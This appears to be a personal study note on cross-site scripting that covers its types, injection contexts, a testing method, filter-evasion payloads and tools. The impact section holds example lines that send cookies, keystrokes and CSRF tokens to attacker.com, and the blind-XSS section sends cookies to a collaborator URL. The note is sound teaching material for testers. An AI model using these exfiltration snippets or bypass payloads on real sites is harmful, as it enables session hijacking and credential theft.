---
created: 2026-05-11
last updated: 2026-05-15
tags:
  - web_hacking
  - client-side
---
## Cross-site scripting 

>**XSS (Cross-Site Scripting)** is a web security vulnerability that allows an attacker to inject **client-side scripts** (typically JavaScript), into web pages viewed by other users. The injected code is executed in the victim's browser within the security context of a **trusted origin**, circumventing the same-origin policy.

>[!note] See [[SOP]].

- XSS is one of the most common web vulnerabilities in the wild; nearly every web application is at least partially exposed to it in some form.

>[!important] XSS is exclusively a client-side vulnerability; it does not directly compromise the server by itself.

- **XSS is usually part of a larger exploit chain.** It paves the way for session hijacking, CSRF bypasses, credential theft, or privilege escalation. 
### How XSS works

- In a typical web application, the server generates HTML, CSS, and JavaScript and sends them to the browser. The browser then parses and renders the response, and executes any scripts it includes.

- If user-controlled input is incorporated in the response without proper validation or encoding, an attacker can inject **malicious JavaScript into that input**. The server then unknowingly includes this content in the response and sends it back to the browser.

- When a victim’s browser processes this response, it treats the injected script as legitimate code and executes it within the context of the vulnerable origin.

- In testing scenarios, the attacker often triggers the payload themselves first. In real attacks, the goal is to trick a victim into making a request (for example, by clicking a crafted link) that causes their browser to receive and execute the malicious script.

This is what is called **Cross-Site Scripting (XSS)**.

> [!important] The browser can't distinguish between legitimate application code and injected attacker code (as long as they share the same origin).

- General attack lifecycle:
	1. **Attacker identifies an injection point** — a parameter, field, or data source reflected in the server response or DOM.
	2. **Attacker crafts a payload** — JavaScript or HTML that triggers JavaScript execution in the given injection context.
	3. **Payload is delivered** — via a crafted URL (reflected XSS), stored data (stored XSS), or DOM manipulation (DOM-based XSS).
	4. **Victim's browser executes the payload** — the script runs in the origin’s context, with access to (non-`HttpOnly`) cookies, DOM, and session data.

### Potential impact

> [!important] XSS can perform anything JavaScript is allowed to do in the victim’s browser context.

- **Session hijacking**
	- Stealing session cookies and replaying them to impersonate the victim.

> [!example]+
> ```js
> fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
> ```

>[!note] Cookies flagged `HttpOnly` are inaccessible via JavaScript.

- **Credential capture**
	- Introducing a keylogging script to capture user keystrokes, intercepting form submissions, or injecting a phishing overlay that mimics the legitimate login UI.

>[!example]+
> ```js
> document.onkeypress = function(e) {
>   fetch('https://attacker.com/log?k=' + encodeURIComponent(e.key));
> };
> ```

- **CSRF token theft**
	- Reading protected pages or DOM elements to extract CSRF tokens and use them in unauthorized state-changing requests.

> [!example]+
> ```js
> fetch('/account/settings')
>   .then(r => r.text())
>   .then(html => {
>     const token = html.match(/name="csrf_token"\s+value="([^"]+)"/)[1];
>     fetch('https://attacker.com/exfil?t=' + token);
>   });
> ```

- **Privilege escalation**
	- Compromising an administrator session and exploiting admin panel functionality (e.g., file upload or code execution) to achieve RCE on the target server. 

- **Content defacement**
	- Injecting or modifying the page's HTML to display attacker-controlled content.

- **Malware Distribution**
	- Redirecting users to exploit kits or [drive-by download](https://en.wikipedia.org/wiki/Drive-by_download) pages.

There are many other variations of XSS attacks, from Bitcoin mining (this is sometimes called *cryptojacking*) to displaying ads. 

> [!note] XSS is generally limited to the browser’s JavaScript environment. However, in rare cases, a vulnerability in the victim's browser (e.g., heap overflow in Chrome) may allow an attacker to escape the browser sandbox and achieve code execution on the victim's machine.
 
### XSS PoC

- The standard XSS PoC during testing is `alert(document.domain)`.
- Using `document.domain` instead of an arbitrary string (e.g., `alert(document.domain)` or `alert(document.domain)`) immediately confirms the execution context; this is especially relevant in real engagements and bug bounty reports.
```js
alert(document.domain)
```

>[!note] `print()` instead of `alert()` 
>- Chrome [restricts](https://chromestatus.com/feature/5148698084376576) `alert()` inside cross-origin `<iframe>` sandboxes. 
>- If you're working in a context where `alert()` is blocked, use `print()` instead.
>
>See [`alert() is dead, long live print() — James Kettle`](https://portswigger.net/research/alert-is-dead-long-live-print).

```js
print()
```

- Other alternatives include `confirm()` and `prompt()`.

---
- For **blind XSS** (where you can't directly observe execution), use an out-of-band payload that causes the victim's browser to make an HTTP request to an endpoint you control (such as collaborator URL):

```js
fetch('https://YOUR-COLLABORATOR-ID.oastify.com/?c=' + encodeURIComponent(document.cookie))
```

## Types of XSS

- **Reflected XSS**
	- The injected script comes from the *current HTTP request*: the payload is *reflected* in the immediate response, and executed by the victim's browser. 
	- This is considered the most common types of XSS, and it's relatively easy to test for and exploit. 

- **Stored XSS**
	- The injected script is first *stored* on the web server and then sent back to users in HTTP responses.
	- This is by far the most severe type of XSS: it affects every user who accesses the affected content.

- **DOM-based XSS**
	- The vulnerability exists purely on the client-side and doesn't involve any server responses. It exploits how client-side JavaScript handles user-controllable data. 
	- This type of XSS allows an attacker to manipulate the DOM based on user input.

## Reflected XSS

>**Reflected XSS**, also called **non-persistent** or **type-I** XSS, is a type of XSS vulnerability that occurs when the injected payload is directly incorporated into the server's immediate response without sufficient validation or sanitization.

>[!note] Reflected XSS is sometimes called **Type-I XSS**, because exploitation requires **a single round of HTTP request and response** — the payload is carried in the request and comes back in the response. 

>[!important]+ On payload delivery
> 
> - The main operational constraint of reflected XSS is **delivery**: the attacker needs to trick the target user into issuing a request with the payload they designed. 
> - This is typically done via crafted links sent through email / social media / messaging or malicious advertisements.
> - However, long and complex URLs often raise suspicion even from unaware users. This is why attackers often obfuscate URLs using [URL shorteners](https://en.wikipedia.org/wiki/URL_shortening)/redirectors or [doppelganger domains](https://en.wikipedia.org/wiki/Doppelganger_domain). 

> [!example]+
> Let's consider an example of a reflected XSS in a URL query parameter.
> Suppose an application displays some text received in one of the `GET` HTTP parameters on an HTML page:
> 
> - Suppose an application has a book search functionality. The query you enter is sent as a `GET` HTTP parameter:
> 
> ```
> https://example.com/book_search?q=Agatha+Christie
> ```
> 
> - The application returns the search results and reflects your query on the page:
> 
> ```html
> <p id="search_q">You searched for: Agatha Christie</p>
> ```
> 
> - If your input is displayed as-is, with no encoding or sanitization, you can inject arbitrary HTML and JavaScript.
> - You enter:
> 
> ```HTML
> <script>alert(document.domain);</script>
> ```
> 
> - In the URL:
> 
> ```
> https://example.com/search?q=%3Cscript%3Ealert(document.domain);%3C/script%3E
> ```
> 
> - The page renders:
> 
> ```HTML
> <p id="search_q"><script>alert(document.domain);</script></p>
> ```
> 
> - Your browser executes the JavaScript introduced by your input as if it came from the server itself — and pops up an alert with `document.domain`. The browser can't distinguish between the original page content and the injected payload.
> - If you trick another user into clicking that link (`https://example.com/search?q=%3Cscript%3Ealert(document.domain);%3C/script%3E`) the JavaScript will be executed in *their browser*.

>[!example]+
> - Yes, XSS is a client-side vulnerability. But the issue starts on the server-side — the application directly incorporates user input into the HTML response without escaping it.
> - For example, in Python Flask, vulnerable server-side code could look like this:
> 
> ```Python
> @app.route('/search')
> def search():
>     search_term = request.args.get('q')
>     return f'<p id="search_q">You searched for: {search_term}</p>'
> ```
> 
> - Here, user-controlled input is simply concatenated into the page. 
> 
>>[!note] From the security perspective, Python f-string interpolation is same as concatenation; it just combines strings together.
> 
> - The fix is to escape or sanitize any user input before embedding it into HTML or JavaScript.
> - In Flask, one safe approach is to use `markupsafe.escape()`:
> 
> ```Python
> from markupsafe import escape
> 
> # <SNIP>
> 
> @app.route('/search')
> def search():
>     search_term = request.args.get('text')
>     sanitized_search_term = escape(search_term)
> 
>     return f'<p id="search_q">You searched for: {sanitized_search_term}</p>'
> ```
> 
> `markupsafe.escape()` converts characters with special meaning in HTML (e.g., `&`, `<`, `>`, `'`, `"`) into HTML-safe encoded variants.
> 
> ```Python
>>> from markupsafe import escape
>>> escape("<script>alert(document.domain);</script>")
> Markup('&lt;script&gt;alert(document.domain);&lt;/script&gt;')
>>> 
> ```
## Stored XSS

>**Stored XSS**, also called **persistent** or **type-II** XSS, is a type of XSS vulnerability that occurs when the injected payload is first stored on the server (such as in a database) and subsequently returned to other as part of legitimate application responses.

- Stored XSS is considered the most severe variant. A single injection affects **every user who views the infected content**. It requires no action beyond normal browsing and can persist **indefinitely** until the payload is removed.

- **Common injection entry points**:
	- Blog comments, forum posts
	- User profile fields (name, bio, avatar URL)
	- Contact / feedback forms
	- File upload metadata, such as filenames
	- Message boards, chat inputs
	- HTTP headers logged and displayed (e.g, `User-Agent`, `Referer`, `X-Forwarded-For`)
	- Support ticket systems
	- Any feature that stores and later displays user-generated content

> [!example]+
> 
> - Suppose you submit a comment under a blog post:
> 
> ```HTTP
> POST /post?id=1 HTTP/1.1
> Host: example.com
> ...
> 
> {
> 	"comment":"Great article, thanks!",
> 	"csrf":"<CSRF_TOKEN>"
> }
> ```
> 
> - The server stores the comment in the database as-is.
> - When this or another user navigates to the blog post, the server pulls the comments from the database and renders them as part ot HTML returned in HTTP response:
> 
> ```HTML
> <div class="comment"><p>Great article, thanks!</p></div>
> ```
> 
> - If the application doesn't validates user input, you can inject malicious JavaScript:
> 
> ```JSON
> {
> 	"comment":"<script src='https://attacker.com/injected.js'></script>",
> 	"csrf":"<CSRF_TOKEN>"
> }
> ```
> 
> - The comment is stored in the database along with others. 
> - When someone navigates to the blog post, the comment is rendered as:
> 
> ```HTML
> <div class="comment"><p><script src='https://attacker.com/injected.js'></script></p></div>
> ```
> 
> - Your script is executed in the victim's browser as soon as the page loads.

## DOM-based XSS

> **DOM-based XSS** is a type of XSS vulnerability that occurs when client-side JavaScript processes attacker-controlled data in an unsafe manner and writes it into the DOM without proper sanitization or encoding.

- Unlike reflected or stored XSS, the vulnerability exists **entirely on the client-side**. The server may never receive, process, or sanitize the malicious payload.
- A typical DOM XSS flow looks like this:
	1. JavaScript reads attacker-controlled data from a DOM **source**
	    - e.g., `location.hash`, `document.cookie`, `postMessage`.
	2. The application processes this data on the client side.
	3. The data is written into a dangerous DOM **sink**
	    - e.g., `innerHTML`, `document.write()`, `eval()`.
	4. The browser interprets the injected content as active HTML or JavaScript and executes it.
	
- In essence, unsafe DOM manipulation leads to JavaScript execution in the victim’s browser.

> [!important]  
> - With reflected and stored XSS, malicious content is introduced into the response by the **server**.
> 
> - With DOM-based XSS, the vulnerable behavior occurs entirely in **client-side JavaScript** after the page has already loaded.

>[!note] The **DOM (Document Object Model)** is a hierarchical representation of the web page that JavaScript can read and modify dynamically.
### Sources and sinks

- A DOM-based XSS requires two components:
	- a **source**
	- a **sink**

>[!important] DOM-based XSS occurs when user-controlled data **flows from a source to a sink without proper sanitization or encoding**.
#### Sources

>A **source** is a JavaScript property that accepts user-controlled data.

- Common sources include:

| Source                            | Notes                                     |
| --------------------------------- | ----------------------------------------- |
| `location.search`                 | URL query string                          |
| `location.hash`                   | URL fragment (`#...`)                     |
| `location.href`                   | Full URL                                  |
| `location.pathname`               | URL path                                  |
| `document.referrer`               | HTTP `Referer` header value               |
| `document.cookie`                 | Accessible cookie values (non-`HttpOnly`) |
| `localStorage` / `sessionStorage` | Client-side storage                       |
| `window.name`                     | Persistent cross-origin window name       |
| `postMessage()` data              | Messages from other windows or frames     |

>[!note] `location.hash` URL fragments are never sent to the server. Server-side filters and logging may never see the payload.

#### Sinks

>A **sink** is a JavaScript function or DOM property that can execute JavaScript or interpret attacker-controlled input as active HTML.

- Common sinks include:

| Sink                              | Risk                                              |
| --------------------------------- | ------------------------------------------------- |
| `element.innerHTML`               | Parses HTML; executes event handlers              |
| `element.outerHTML`               | Replaces element with parsed HTML                 |
| `document.write()`                | Writes raw HTML into the page                     |
| `insertAdjacentHTML()`            | Inserts parsed HTML                               |
| `eval()`                          | Executes arbitrary JavaScript                     |
| `Function()`                      | Dynamically creates executable code               |
| `setTimeout(string)`              | Executes string as code (after an optional delay) |
| `setInterval(string)`             | Executes string as code repeatedly                |
| `element.src` / `element.href`    | Executes JavaScript with `javascript:` URLs       |
| `element.href` with `javascript:` | Can redirect to `javascript:` URLs                |

>[!important]+ Not all sinks are equally dangerous.
>For example, `textContent` and `innerText` generally treat input as plain text and are therefore much safer than `innerHTML`.

>[!important] `innerHTML` does not accept `<script>` tags as a security feature.
>


> [!example]+
> - Suppose a web application reads a search term from the URL and displays it dynamically on the page:
> 
> ```js
> const search = new URL(window.location).searchParams.get('q');
> const results = document.getElementById('results');
> 
> results.innerHTML = 'You searched for: ' + search;
> ```
> 
> - If you visit:
> 
> ```HTML
> https://example.com/search?q=<img src=x onerror=alert(document.domain)>
> ```
> 
> - the browser constructs the following HTML dynamically:
> 
> ```HTML
> You searched for: <img src=x onerror=alert(document.domain)>
> ```
> 
> - The browser parses the injected `<img>` tag, triggers the `onerror` event (`src=x` causes `404 Not Found`), and executes the payload.
> 
> - This is a DOM-based XSS vulnerability, where:
> 	- `window.location.search` is the **source**
> 	- `innerHTML` is the **sink**
> 
>>[!important] In this example, the server never generates malicious HTML. The vulnerable behavior occurs entirely in client-side JavaScript.
### Taint flow analysis

- The primary objective of testing for DOM XSS is to determine whether attacker-controlled data can flow from a **source** into a dangerous **sink** without adequate sanitization.

This process is called **taint flow analysis** (or **taint tracking**).

>**Taint flow analysis**, sometimes called **taint tracking**, is the process tracing the path that untrusted data, called a **taint**, takes from its entry point, the **source**, to security-relevant functions or properties, the **sink**. 

> A **taint** is attacker-controlled data, or any value derived from it.

- Taint flow analysis tracks how this data moves through the application:

	1. Data enters from a source
	2. The application processes or transforms it
	3. The data eventually reaches a sink

- If the data reaches the sink without proper sanitization or encoding, DOM-based XSS may be possible.

>[!example]+ 
> 1. **Source** — attacker-controlled input from the URL:
> 
> ```js
> const name = location.search.split('=')[1];
> ```
> 
> 2. **Taint transfer** — the value is copied into another variable:
> 
> ```js
> const greeting = 'Hello, ' + name;
> ```
> 
> 3. **Sink** — the value is inserted into the DOM:
> 
> ```js
> document.getElementById('output').innerHTML = greeting;
> ```
> 
> 4. **Payload**:
> 
> ```html
> ?name=<img src=x onerror=alert(document.domain)>
> ```
> - Because the attacker-controlled input flows into `innerHTML` without sanitization, the browser interprets the payload as HTML and executes the JavaScript.

> [!interesting]+ Static vs. dynamic taint analysis
> There are two primary approaches to taint analysis.
> - **Static taint analysis** — examines JavaScript source code without executing it; typically involves code review and automated static analysis tools.
> - **Dynamic taint analysis** — observes tainted data during actual execution in the browser.
> 
> For modern JavaScript-heavy applications, combining static and dynamic analysis is usually the most effective approach.
## XSS contexts

XSS payloads can be injected into a variety of different **contexts** within a web page. The injection context determines how the payload should look like.

Common contexts include:
- HTML element context (body context)
- HTML attribute values
- JavaScript context
- CSS context
- URL/Link context (e.g., `href`, `src`, etc.)
- Event handler context
- DOM-based context

### HTML body context

- The input appears directly between HTML tags:

```HTML
<p>You searched for: USER_INPUT</p>
```

- Payloads:

```HTML
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>

# breaking out of existing tags
</p><script>alert(document.domain)</script>

# introduce custom tags
<xss onfocus=alert(document.domain) autofocus tabindex=1>

# onresize iframe
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=<body onresize="print()">" onload=this.style.width='100px'>

# svg
<svg><animeatetransform onbegin=alert(document.domain)>
```

### HTTP attribute values

- The input appears inside an attribute:

```HTML
<input value="USER_INPUT">
<a href="USER_INPUT">Link</a>
```

- The goal is usually to break out of the existing attribute and inject a new one:

```HTML
" onmouseover="alert(document.domain) 
				-> <input value="" onmouseover="alert(document.domain)">
```

- Payloads:

```HTML
# payloads that break out of the attribute
" onmouseover="alert(document.domain) -> <a href="" onmouseover="alert(document.domain)">Link</a>

# try single and double quotes
" onmouseover="alert(document.domain)
' onmouseover='alert(document.domain)

# test event handlers
<img src=x onerror=alert(document.domain)>

" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(document.domain) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```

### JavaScript context 

- The input is inserted inside JavaScript code:
	- Between `<script>` tags
	- In a `.js` file
	- Inside an event handler

```HTML
<script>
var q = 'USER_INPUT';
</script>
```

- The goal is to break out of the string and inject JavaScript:

```js
';alert(document.domain);//
				-> var q = '';alert(document.domain);//';
```

- Escape the string:
	- `//` and `/**/` are JavaScript comments. 

```JS
'-alert(document.domain)-'
';alert(document.domain)//
';alert(document.domain)//
\';alert(document.domain)/
\'; alert(document.domain); //
a'; alert(document.domain); var x='b
```

- Escape the `<script>` tag and enter it again:

```HTML
</script><script>alert(window.location)</script>
```
### URL context

- The input is placed inside a URL attribute:

```HTML
<a href="USER_INPUT">Link</a>
<img src="USER_INPUT">
```

- Payloads:

```js
javascript:alert(document.domain)alert(document.location)
data:text/html,<script>alert(document.domain)</script>
```
### Event handler context

- The input appears inside an event handler:

```HTML
<button onclick="USER_INPUT">
```

- The goal is to get the injected code to run when the event fires:

```js
alert(document.domain)
				-> <button onclick="alert(document.domain)">
```

- Payloads:

```HTML
# inject JavaScript directly
alert(document.domain)

# if quotes are involved
';alert(document.domain);//

# style events
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

# payload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(document.domain)"></div>
# moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(document.domain)"></div>
```

### CSS context

- The input appears inside CSS:

```HTML
<style>
	body {
		background:url('USER_INPUT');
	}
</style>
```

- Payloads:

```JS
// javascript: URL:
url(javascript:alert(document.domain)

// break out of CSS property
'); background-image:url(javascript:alert(document.domain));//

// break out of the <style> tag:
');}</style><script>alert(document.domain);</script><style>
```

## XSS testing methodology
### 1. Identify all user-controlled input

- Enumerate every location where user-controlled data enters the application. 

- Typical input vectors include:
	- URL query parameters
	- `POST` body parameters
	- JSON or XML request bodies
	- HTTP headers
		- `User-Agent`
		- `Referer`
		- `X-Forwarded-For`
	- Cookies
	- File names and metadata (file upload)
	- WebSocket messages
	- URL fragments (`#flagment`)
	- `window.postMesssage()` data
	- Browser storage
		- `localStorage`
		- `sessionStorage`

- For stored XSS, also investigate any functionality that stores and later displays data:
	- Blog comments, forum posts
	- User profile fields (name, bio, avatar URL)
	- Contact / feedback forms
	- File upload metadata, such as filenames
	- Message boards, chat inputs
	- HTTP headers logged and displayed (e.g, `User-Agent`, `Referer`, `X-Forwarded-For`)
	- Support ticket systems
	- Any feature that stores and later displays user-generated content

>[!tip] During XSS testing, treat every piece of data you control as potentially exploitable — even if it is not immediately reflected in the response.

### 2. Trace where the input is reflected

- Once an input point is identified, determine whether and where the application reflects or stores the supplied value.
- Start with unique canary strings like:

```
xsstest1234
```

>[!note] Unique strings are important when you test for stored XSS. If you use just one test input and later see it reflected somewhere in the application, you won't know exactly which input caused that.

- Submit the input and search for it:
	- HTTP responses
	- Rendered HTML
	- DOM content
	- JavaScript variables
	- API responses 
- You want to understand:
	- Is the input reflected immeeidately?
	- Is it stored and rendered later?
	- Is it processed by client-side JavaScript?
	- Does it appear in the raw HTML or only in the live DOM?
	- Is it transformed, encoded, or filtered?
- This helps classify the vulnerability as reflected, stored, or DOM-based XSS.

### 3. Determine the injection context

- What payload works depends entirely on the context where the input appears. The same payload may succeed in one context and completely fail in another.
- Common contexts include:
	- HTML body context
	- HTML attribute context
	- JavaScript context
	- CSS context
	- Event handler context

>[!note] See [[#XSS contexts]].

### 4. Test with PoC payloads

- After identifying the context, strat with simple proof-of-concept payloads to determine whether JavaScript execution is possible.

```
alert(document.domain)
```

>[!important] Not all successful injections produce visible execution immediately.

- Pay attention to:
	- Browser console messages
	- DOM mutations
	- Network requests
	- Dynamically inserted elements
	- CSP violations

>[!tip] Browser Developer Tools (`F12` or `Ctrl+Shift+I`) are essential. 

### 5. Analyze filtering and sanitization

- If the payload is blocked, encoded, or partially modified, analyze how the application handles dangerous characters.
- Commonly filtered characters and keywords:

```
<
>
"
'
(
)
javascript:
```

- Common defensive mechanisms:
	- HTML entity encoding
	- URL encoding
	- Escaping
	- Blacklists
	- WAF filtering
	- CSP

- Observe how the application transforms input, for example:
	- `<script>` -> `&lt;script&gt;` — HTML encoding
	- `<script>` -> `script` — Sanitization

### 6. Attempt filter bypasses

- Once you know how filtering works, attempt bypasses suitable for the context.

>[!note] See [[#Bypassing validation]].

## Bypassing validation

Bypassing XSS filters is fundamentally about understanding _how the application tries to stop injection_ and _where those defenses fail in context_. There is no universal bypass; effectiveness depends heavily on the injection context, encoding behavior, and filtering strategy.

A practical approach is:

1. Identify the type of XSS (reflected, stored, or DOM-based) and the injection context (HTML body, attribute, JavaScript, CSS, etc.).
2. Determine which characters, tags, attributes, and keywords are blocked (e.g., `<`, `>`, `"`, `'`, `javascript:`).
3. Check whether the application applies encoding or sanitization (HTML entity encoding, URL encoding, Base64 transformation, or stripping).
4. Evaluate whether you can break out of the current context and reintroduce executable structure.
5. Adapt payloads incrementally based on observed filtering behavior.

>[!tip] Most XSS defenses rely on exact pattern matching or keyword filtering (e.g., blocking `<script>`, `javascript:`, or event handlers like `onerror`). This approach is inherently fragile because it often fails to account for all syntax variations and encodings that browsers still interpret as valid HTML or JavaScript.

>[!tip] Modern browsers often normalize malformed HTML, decode multiple encoding layers, and tolerate a wide range of syntactic validations that pass filters. This mismatch between _filter assumptions_ and _browser parsing behavior_ is what makes XSS filtering difficult to get right.

>[!note] See [`XSS Filter Evasion Cheat Sheet — OWASP Cheat Sheet Series`](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html).

### Common bypasses

- **HTML entity encoding**
	- Use decimal (`&#60;`), hexadecimal (`&#x3C;`), or zero-padded entities (`&#000060;`) to represent special characters like `<` and `>`. Browsers decode these entities before rendering.

```HTML
<img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>
```

- **Use polymorphic or chained payloads**
	- Modify the payload to obfuscate the original syntax so that functionality remains the same. For example, use alternative characters (e.g., replace parentheses with backtics or refer to object attributes with square brackets rather than period: `object_name[attribute_name]`) or different function calls (e.g., `setTimeout(alert())` instead of just `alert()`).
	- Even Unicode encoding may help.

```HTML
<svg/onload=alert`1`>
<svg/onload=setTimeout`alert\x281\x29`>
<img/junk/src=x onerror="alert()">
<script/junk>alert()</script>
```

```HTML
<img src=x onerror='alert()'>
<img src=x onerror=`alert()`>
<img src="x" onerror="alert()">
<img src='x' onerror="alert()">
<img src=`x` onerror="alert()">
```

- **Incomplete or nested tags**
	- Use incomplete or nested tags that browsers auto-correct but filters fail to detect.
	
```HTML
<<script>script>alert(document.domain);//<</script>/script>
<<img src=x onerror="alert()">
<<script>alert(document.domain);//<</script>
```

- **Unexpected characters**
	- Inject URL-encoded `NULL` bytes at any position of attribute value, whitespaces, tags, CR/LF, etc.

```HTML
<img src=x onerror="a[%00]ert()">
<[%00]img src=x onerror="alert()">
<i[%00]mg src=x onerror="alert()">
<img src=x onerror=[%00]"alert()">
```

- **Use custom tags**

```HTML
<x src=x onerror="alert()"></x>
```

- **Case variation**
	- Change case of keywords (`JaVaScRiPt:`) to bypass case-sensitive filters.

```HTML
<iMg src=x onerror="alert()">
```

- **Nested encoding**
	- Encode payloads several times, e.g., double URL encoding `%253Cscript%253E` (`<script>`).

- **Replace angle brackets**

```HTML
«img onerror=alert(document.domain) src=a»
```

- **Base64-encoding**

```HTML
<body onload="eval(atob('YWxlcnQoMSk='))">
```

- **ASCII `fromCharCode()`**
	- If special characters and keywords are blocked, try to to hide XSS payloads with the `fromCharCode()` function which translates ASCII letter codes to characters.

```HTML
<img src=javascript:alert(String.fromCharCode(88,83,83))>
```

```HTML
<!-- event handler in img tag to bypass <script> filter -->
<img src=x onerror=alert(document.domain)>

<!-- broken up javascript: link -->
<a href="java&#x09;script:alert(document.domain)">Click me</a>

<!-- Base64 encoded payload decoded at runtime -->
<body onload="eval(atob('YWxlcnQoMSk='))">

<!-- HTML entity-encoded <script> tag -->
&#x3C;script&#x3E;alert(document.domain)&#x3C;/script&#x3E;

<!-- polyglot payload for attribute + tag + URL contexts -->
<svg/onload=alert(document.domain)>
```

- **US-ASCII encoding**

	- US-ASCII encoding (found by Kurt Huwig) uses malformed ASCII encoding with `7` bits instead of `8`.

	- This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding.

```HTMLw
¼script¾alert(¢XSS¢)¼/script¾
```

>[!tip]+ **Introduce `<base>` tags**
> - The `<base>` HTML tag is used to specify a base URL or target for relative links on a web page. So, if there're any relative `href` or `src` URLs on the page, the browser will try to request them from the domain specified in the `<base>`. 
> - If you can inject such `<base>` tag, **you might be able to control all relative links on the page**.
> - According to specifications, `<base>` tags should appear within the `<head>` section of the HTML page, but the browser might accept it in other places of the document. 
> 
> ```HTML
> <base href=”https://attacker.net/badscripts/”>
> ...
> <script src=”goodscript.js”></script>
> <!-- points to https://attacker.net/badscripts/goodscript.js -->
> ```

>[!tip]  Combine multiple evasion methods: encoding + event handlers + malformed tags.
### Bypassing tag or attribute black-listing

Blacklisting is an inherently flawed way to block dangerous input, and yet, it's quite commonly used. If the application blocks certain tags or attributes that are likely to be exploited in XSS, this doesn't makes the application invulnerable — it might always miss something you can exploit.

To find out if some tags or attributes are still allowed, you can enumerate them, as if you were enumerating application files or directories.

- You can obtain a list of all tags and event handlers that can be used for XSS from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) from PortSwigger.

>[!example]+ Example: enumerating tags and event handlers with `ffuf`
>- To enumerate allowed tags:
> ```bash
> ffuf -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36' -u 'https://example.com/page?search=%3CFUZZ%3E' -w tags.txt:FUZZ -mc all
> ```
> - To enumerate allowed event handlers: 
> ```bash
> ffuf -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36' -u 'https://example.com/page?search=%3Cbody+FUZZ%3D1%3E' -w events.txt:FUZZ -mc all
> ```

>[!tip] Remember about `javascript:` URLs; if they're allowed, you can insert them into `href`, `src`, or similar arguments. JavaScript will execute on link click.
### Bypassing blocked `javascript:` links

If the application blocks `javascript:` links but uses weak blacklist-based filters, you might be able to bypass restrictions by, say, encoding one of the letters of the payload:

 - Decimal ASCII codes:

```HTML
<a href="&#106;avascript:alert(document.location)">Link</a>
```

- Hexadecimal ASCII codes:

```HTML
<a href="&#x6A;avascript:alert(document.location)">Link</a>
```

## Payload reference

- [`Cross Site Scripting — PayloadAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [`Ultimate XSS Payload List & Learning Hub — payload-box`](https://github.com/payload-box/xss-payload-list)
- [`Cross-site scripting (XSS) cheat sheet — PortSwigger`](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## Automated discovery

- Common open-source tools that can assist you in XSS discovery:
	- [`XSS Strike`](https://github.com/s0md3v/XSStrike)
	- [`Brute XSS`](https://github.com/rajeshmajumdar/BruteXSS)
	- [`XSSer`](https://github.com/epsylon/xsser)

>[!note]+ `XSS Strike`: Installation
> 
> ```bash
> git clone https://github.com/s0md3v/XSStrike.git
> ```
> ```bash
> cd XSStrike
> ```
> ```bash
> pip install -r requirements.txt
> ```

- `XSS Strike` basic usage:

```bash
python3 xsstrike.py -u "https://example.com/index.php?task=test"
```


## References and further reading

- [`Cross Site Scripting — PayloadAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [`Ultimate XSS Payload List & Learning Hub — payload-box`](https://github.com/payload-box/xss-payload-list)
- [`Cross-site scripting (XSS) cheat sheet — PortSwigger`](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [`XSS Filter Evasion Cheat Sheet — OWASP Cheat Sheet Series`](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)


- [`Cross-site scripting — PortSwigger Web Security Academy`](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting)

-  [`alert() is dead, long live print() — PortSwigger Research`](https://portswigger.net/research/alert-is-dead-long-live-print).

